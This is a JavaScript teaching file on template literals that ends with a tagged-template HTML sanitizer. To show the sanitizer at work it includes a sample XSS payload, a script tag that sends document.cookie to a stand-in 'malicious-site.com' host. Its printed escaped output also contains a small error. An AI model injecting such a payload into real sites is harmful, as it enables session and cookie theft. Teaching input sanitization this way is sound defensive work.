/*
Template literals are a modern way to work with strings in JavaScript, introduced in ES6 (ES2015).
They are enclosed by backtick (`) characters instead of traditional single or double quotes.

Template literals solve the clunky syntax of traditional string concatenation by providing three
major features: string interpolation, multi-line strings, and embedded expressions.
*/

/*
1. String Interpolation (Variables in Strings)

Instead of breaking up your strings with plus signs (+), you can inject variables directly into the
string using the ${variable} placeholder.
*/

const name = "Alice";
const role = "Developer";

// Old way (Concatenation)
const oldWay = "Hello, my name is " + name + " and I am a " + role + ".";

//  Template literal way
const newWay = `Hello, my name is ${name} and I am a ${role}.`;

/*
2. Embedded Expressions

The placeholder inside ${} is not just for variables; you can execute any valid JavaScript
expression inside it, including math, function calls, or ternary operators.
*/

const price = 19.99;
const quantity = 3;

// Mathematical calculation
const total = `Total cost: $${(price * quantity).toFixed(2)}`;
// Output: "Total cost: $59.97"

// Ternary / Conditional operator
const userAge = 20;
const status = `You are ${userAge >= 21 ? "allowed" : "not allowed"} to enter.`;

/*
3. Multi-line Strings

With traditional strings, creating a new line requires adding a newline character (\n) and
concatenating lines together. Template literals respect whatever line breaks or whitespace you type
inside the backticks.
*/

// Old way
const oldHTML = "<div>\n" + "  <h1>Hello</h1>\n" + "</div>";

//  Template literal way
const newHTML = `
    <div>
        <h1>Hello</h1>
    </div>
`;

/*
Advanced Usage: Tagged Templates

An advanced feature of template literals is Tagged Templates. You can place a function name right
before the backticks. The function can then parse the string parts and expressions to create custom
string manipulation logic.

STEPS TO BETTER UNDERSTAND WHAT HAPPENS UNDER THE HOOD:

1. The Engine Scans for Keyframes (${ and })As the engine reads the template string from left to
   right, it looks for the unique marker boundaries of placeholders: ${ and }.Everything outside of
   those boundaries is immediately categorized as a literal string piece. Everything inside those
   boundaries is marked as an expression to be evaluated.

2. Slicing the Strings ArrayThe engine walks through the text and slices it everywhere an expression
   begins or ends.Even if you have two expressions right next to each other (like
   ${firstName}${lastName}), or an expression at the very end of the line, the engine will still
   slice it and insert an empty string "" into the array to ensure the pattern remains
   consistent.Because it slices on either side of every variable, the strings array is guaranteed to
   always have exactly one more item than the number of expressions.

3. Evaluating and Collecting the ValuesNext, the engine pauses to run the JavaScript code hidden
   inside your placeholders. It calculates the final values of those variables, math problems, or
   function calls, and bundles them cleanly into a secondary list.

Best used for:
- One of the main use cases for tagged templates is sanitizing user input to prevent security
  vulnerabilities like Cross-Site Scripting (XSS).
- Styled components
- database queries
*/

// EXAMPLE
// 1. Define the tag function
function sanitizeHtml(strings, ...values) {
    return strings.reduce((result, currentString, index) => {
        // Get the current dynamic value and escape dangerous characters
        let value = values[index - 1];

        if (typeof value === "string") {
            value = value
                .replace(/&/g, "&amp;")
                .replace(/</g, "&lt;")
                .replace(/>/g, "&gt;")
                .replace(/"/g, "&quot;")
                .replace(/'/g, "&#x27;");
        } else if (value === undefined) {
            value = "";
        }

        // Assemble the final string piece by piece
        return result + value + currentString;
    });
}

// 2. Simulate unsafe user input
const userComment = `<script>fetch('http://malicious-site.com' + document.cookie)</script>`;
const username = "Alex";

// 3. Apply the tag function
const safePost = sanitizeHtml`
  <div class="comment">
    <h3>Posted by ${username}</h3>
    <p>${userComment}</p>
  </div>
`;

console.log(safePost);

/*
Steps to Explain what is happening in the tagged template example

- Step 1: How the Function is Called

Instead of using parentheses like a normal function (sanitizeHtml(...)), you attach the function
name directly to the front of the backticks. JavaScript automatically splits the template literal
into two categories and passes them to your function arguments:strings (Array): An array of all the
literal text segments between your variables....values (Rest Parameter Array): An array containing
the evaluated results of the ${} placeholders.

- Step 2: Looking Inside the Arguments

For the example above, JavaScript parses the template and passes these exact arguments to
sanitizeHtml:
*/

// stings array
['\n  <div class=\"comment\">\n    <h3>Posted by ', "</h3>\n    <p>", "</p>\n  </div>\n"];

// values array
["Alex", "<script>fetch('http://malicious-site.com...</script>"];

/*
- Step 3: Processing and Reassembling

Inside the function, we use .reduce() to loop through the string parts and glue them back
together.During the loop, the function intercepts the dynamic values. It leaves "Alex" alone, but
when it encounters the raw HTML inside userComment, it modifies the text. The dangerous <script>
tags are harmlessly converted into safe HTML entities (&lt;script&gt;)
*/

// Final Output Because the tag cleaned the input, the browser will display the safe text
<div class="comment">
    <h3>Posted by Alex</h3>
    <p>&lt;script&gt;fetch(&#x27;http://malicious-site.com; + document.cookie)&lt;/script&gt;</p>
</div>;
